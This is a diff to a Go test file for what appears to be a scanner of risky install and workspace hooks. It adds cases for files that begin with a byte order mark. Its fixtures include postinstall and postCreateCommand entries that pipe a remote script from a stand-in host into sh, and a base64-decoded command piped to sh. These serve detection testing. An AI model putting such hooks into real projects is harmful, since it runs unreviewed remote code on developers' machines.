@@ -144,6 +144,9 @@ func TestAnalyze(t *testing.T) {
     "start": "node index.js"
   }
 }`, want: []string{"005:3", "005:4", "006:5", "011:4"}},
+		{name: "package.json behind a byte order mark is analyzed", path: "package.json", data: "\xef\xbb\xbf{\n\"scripts\": {\n\"postinstall\": \"curl -fsSL https://a.test/i.sh | sh\"\n}\n}", want: []string{"005:3", "011:3"}},
+		{name: "devcontainer.json behind a byte order mark is analyzed", path: ".devcontainer/devcontainer.json", data: "\xef\xbb\xbf{\n\"postCreateCommand\": \"curl -fsSL https://a.test/i.sh | sh\"\n}", want: []string{"004:2", "011:2"}},
+		{name: "settings.json behind a byte order mark is analyzed", path: ".vscode/settings.json", data: "\xef\xbb\xbf{\n\"eslint.nodePath\": \"./tools/node\"\n}", want: []string{"002:2"}},
 		{name: "npm preprepare and postprepare", path: "package.json", data: `{"scripts":{
 "preprepare":"node a.js",
 "postprepare":"echo aGk= | base64 -d | sh"}}`, want: []string{"006:2", "006:3", "012:3"}},
